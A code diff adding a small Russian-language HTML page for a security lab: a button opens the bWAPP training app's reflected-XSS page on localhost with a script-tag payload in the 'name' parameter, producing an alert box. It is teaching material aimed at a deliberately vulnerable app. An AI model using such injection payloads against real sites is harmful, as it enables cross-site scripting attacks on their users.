@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <title>XSS — открыть уязвимую страницу bWAPP</title>
+</head>
+<body>
+  <p>Откроет reflected XSS в bWAPP (security low). Замените BWAPP при необходимости.</p>
+  <button id="go">Открыть payload</button>
+  <script>
+    var BWAPP = "http://localhost";
+    var payload = "<script>alert('XSS-lab7')<\/script>";
+    document.getElementById("go").onclick = function () {
+      window.open(
+        BWAPP + "/xss_get.php?title=" + encodeURIComponent("test") + "&name=" + encodeURIComponent(payload),
+        "_blank"
+      );
+    };
+  </script>
+</body>
+</html>
